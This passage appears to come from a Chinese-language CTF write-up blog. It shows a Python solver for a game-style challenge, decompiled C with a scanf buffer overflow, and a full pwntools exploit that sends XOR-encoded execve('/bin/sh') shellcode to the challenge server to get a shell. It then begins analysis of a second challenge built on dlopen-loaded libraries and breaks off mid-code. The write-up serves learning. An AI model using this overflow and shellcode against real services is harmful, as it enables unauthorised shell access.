class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel2</span><span class="params">(a,s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"D0l1,1,1,1,1,1"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,1,1,2"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,1,2,1"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,1,2,2"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,2,1"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,2,2"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,1,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,1,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,2,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,2,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,1,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,1,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,2,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,2,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,1,1"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,1,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,2,1"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,2,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,2,1"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,2,2"</span>, [<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel3(n,s+<span class="string">','</span>+x[i][<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel3</span><span class="params">(a, s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"HuNgRYT1m3,1,1,2"</span>, [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,1,2,1"</span>, [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,1,2,3"</span>, [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,2,1,2"</span>, [<span class="number">1</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,2,2,1"</span>, [<span class="number">0</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,2,2,3"</span>, [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,3,1,2"</span>, [<span class="number">1</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,3,2,1"</span>, [<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,3,2,3"</span>, [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel4(n, s+<span class="string">','</span>+x[i][<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel4</span><span class="params">(a,s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"F0uRS3aS0n,1,1,AAAA,1,1,2"</span>, [<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"F0uRS3aS0n,1,1,AAAA,1,2"</span>, [<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"F0uRS3aS0n,1,1,AAAA,2"</span>, [<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel5(n,s+<span class="string">','</span>+x[i][<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel5</span><span class="params">(a,s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"T1kT4kT0Kk,2,1,1,2,1"</span>, [<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"T1kT4kT0Kk,2,1,2,2,1"</span>, [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"T1kT4kT0Kk,3,2,2,1"</span>, [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">      <span class="keyword">if</span> (n[j] != <span class="number">5</span>): <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">4</span>):</span><br><span class="line">        final = s+<span class="string">','</span>+x[i][<span class="number">0</span>]</span><br><span class="line">        print(final.replace(<span class="string">','</span>,<span class="string">'\n'</span>))</span><br><span class="line">        quit()</span><br><span class="line"> </span><br><span class="line">addLevel1([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>将输出的过程pipe到nc就行了：<code>./solve.py | nc 110.10.147.104 13152</code>。</p><p>大佬还给出一种pwn的做法，也不是很复杂。显然所有的<code>scanf(&quot;%s&quot;, &amp;buf);</code>都存在bof，所有的key都能是可以被覆盖修改的，例如这个func：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">vul</span><span class="params">(__int64 key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  put_s(<span class="string">"King : You have only 1 chance."</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check(&amp;buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    encrypt_func(sub_4016D0, dword_607114, (<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    sub_4016D0(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  end_game(<span class="string">"King : Wrong! You don't have ability to solve the worries of the people!"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先是要过check：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">check</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">26</span>]; <span class="comment">// [rsp+30h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">26</span>]; <span class="comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+72h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v5, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">"ALICEAWTQJMJXTSPPZVCIDGQYRDINMCP"</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, input, <span class="number">5u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5</span>; i &lt; <span class="built_in">strlen</span>(input); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[(input[i] - <span class="number">65</span> + dest[v2] - <span class="number">65</span>) % <span class="number">26</span>] != v6[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v2 = (v2 + <span class="number">1</span>) % <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>符合条件的字串为<code>AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP</code>。过了check之后，覆盖掉key，送上shellcode和key的异或，并且确保异或后的字串中不存在使scanf断开的字符即可。之后程序会调用<code>encrypt_func</code>解密shellcode最后get shell。<a href="https://gist.github.com/Jinmo/ac77fa58ff7e61b239637850ac869d8b" target="_blank" rel="noopener">大佬的exp</a>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'110.10.147.104'</span>, <span class="number">13152</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">1 lOv3 1 2</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">1 D0l1 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2 1 HuNgRYT1m3</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">1 2</span></span><br><span class="line"><span class="string">F0uRS3aS0n 1 1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">    /* execve(path='/bin///sh', argv=['sh'], envp=0) */</span></span><br><span class="line"><span class="string">    /* push '/bin///sh\x00' */</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    mov rax, 0x732f2f2f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    /* push argument array ['sh\x00'] */</span></span><br><span class="line"><span class="string">    /* push 'sh\x00' */</span></span><br><span class="line"><span class="string">    push 0x1010101 ^ 0x6873</span></span><br><span class="line"><span class="string">    xor dword ptr [rsp], 0x1010101</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    push rsi /* null terminate */</span></span><br><span class="line"><span class="string">    push 8</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    add rsi, rsp</span></span><br><span class="line"><span class="string">    push rsi /* 'sh\x00' */</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    /* call execve() */</span></span><br><span class="line"><span class="string">    push SYS_execve /* 0x3b */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">xorkey = [ord(x) ^ ord(y) <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(<span class="string">'\x13x\xfc\xb7\x1b\xb0\x8ds\xb9\x13\xba\xb9\x00\xaa\xdaf\x95\xda&#125;\x9e\x02\xb90\xbe\xd8&amp;\x1f\t\x10n\xcdu\x89S\x83\xbad jNF\xbb`#\t\x13a\xd8u\x96G\xe0\xfcW5iAS\xbb&#123;"jUR\xd8v\x95R\xe0\xe7Ci/rS\xb8t\x04jNF\xbb0\xa2R\xe3\xe8V|4f0\xfeG\x19iAS\xbb+\xaa1\xa5\xdbV\x0c;s0\xd1\x86t5R\xbb\xc5\x92\xac\xcf\xd1\xa6t5R\xbb\xdf\x92\xac\xcf\xe5&#123;\x15/rS\xb8THjNF\xbbxC\t\x13a\xd8%i\x1c\x10u\xd9V\xce8s0/\xcf\xc94\xdb\xa3\xba\xa7\xec T\x060\xcdRS3a\xbb\xda\x9e\xb9\xcf\xcdRS3a\xbbI\x90\xb9\xcf'</span>, asm(shellcode))]</span><br><span class="line">xorkey = bytearray(xorkey)</span><br><span class="line"><span class="keyword">print</span> hexdump(xorkey)</span><br><span class="line"><span class="keyword">assert</span> all(x <span class="keyword">not</span> <span class="keyword">in</span> str(xorkey) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'\x00 \r\r\n\t'</span>)</span><br><span class="line">payload = (<span class="string">'AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP'</span>).ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>) + xorkey + <span class="string">'\x00'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="20000"><a href="#20000" class="headerlink" title="20000"></a>20000</h1><p>给了一个64位的elf还有20000个<code>.so</code>文件。拖进ida看到main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> number; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v8)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">void</span> *handle; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+84h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  backgroud();</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"INPUT : "</span>, <span class="number">0L</span>L, &amp;v12);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;number);</span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> &amp;&amp; number &gt; <span class="number">20000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Invalid Input"</span>, &amp;number);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"./20000_so/lib_%d.so"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)number);</span><br><span class="line">  handle = dlopen(&amp;s, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( handle )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = handle;</span><br><span class="line">    v8 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *))dlsym(handle, <span class="string">"test"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8(v5, <span class="string">"test"</span>);</span><br><span class="line">      dlclose(handle);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = dlerror();</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v6);</span><br><span class="line">      dlclose(handle);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = dlerror();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v3);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序要求我们输入一个<code>0～20000</code>之间的数字，然后会读取任意一个<code>.so</code>文件。主要是两个函数<a href="https://blog.csdn.net/kingkong1024/article/details/8474210" target="_blank" rel="noopener">dlopen和dlsym</a>，前者打开动态链接库，并返回一个句柄；后者用来打开动态链接库中的函数。</p><p>随机打开几个<code>.so</code>文件看看有什么。<code>lib_1139.so</code>中看到一个<code>test()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v3)(<span class="keyword">char</span> *, <span class="keyword">char</span> *); <span class="comment">// [rsp+0h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v4)(<span class="keyword">char</span> *); <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *handle; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-90h]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+50h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+60h] [rbp-50h]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  handle = dlopen(<span class="string">"./20000_so/lib_17305.so"</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( handle )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">char</span> 